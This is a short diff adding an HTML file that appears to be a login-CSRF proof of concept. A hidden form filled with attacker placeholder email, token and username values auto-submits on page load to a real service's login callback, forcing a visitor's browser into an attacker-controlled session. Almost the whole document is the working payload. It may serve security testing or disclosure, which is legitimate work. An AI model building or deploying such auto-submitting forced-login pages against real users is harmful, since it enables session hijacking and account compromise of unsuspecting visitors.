@@ -1,0 +1,9 @@
+<!-- form2.html -->
+<form id="f" method="GET" action="https://vercel.com/login/callback">
+  <input name="confirmed" value="1">
+  <input name="email" value="ATTACKER_EMAIL">
+  <input name="token" value="FRESH_TOKEN">
+  <input name="username" value="ATTACKER_USERNAME">
+  <input name="redirect" value="server">
+</form>
+<script>document.getElementById("f").submit();</script>
